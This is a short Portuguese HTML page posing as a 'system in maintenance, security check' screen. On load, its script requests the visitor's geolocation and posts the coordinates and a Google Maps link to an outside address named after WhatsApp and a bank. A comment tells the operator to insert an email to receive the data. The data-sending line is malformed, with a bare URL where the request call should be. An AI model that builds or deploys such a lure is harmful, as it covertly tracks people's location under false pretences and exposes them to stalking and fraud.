<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processando...</title>
    <style>
        body { background-color: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial, sans-serif; text-align: center; }
    </style>
</head>
<body>
    <div>
        <h1>SISTEMA EM MANUTENÇÃO</h1>
        <p>Aguarde a verificação de segurança...</p>
    </div>
    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(enviarLocalizacao, erro);
            }
        };
        function enviarLocalizacao(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            // Substitua SEU_EMAIL_AQUI pelo seu e-mail real para receber os dados
            https://pabloovaroso-code.github.io/whatsapp-Banco/, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    Latitude: lat,
                    Longitude: lon,
                    Mapa: `https://www.google.com/maps?q=${lat},${lon}`
                })
            }).then(() => { console.log("Dados enviados."); });
        }
        function erro() { console.log("Permissão negada."); }
    </script>
</body>
</html>
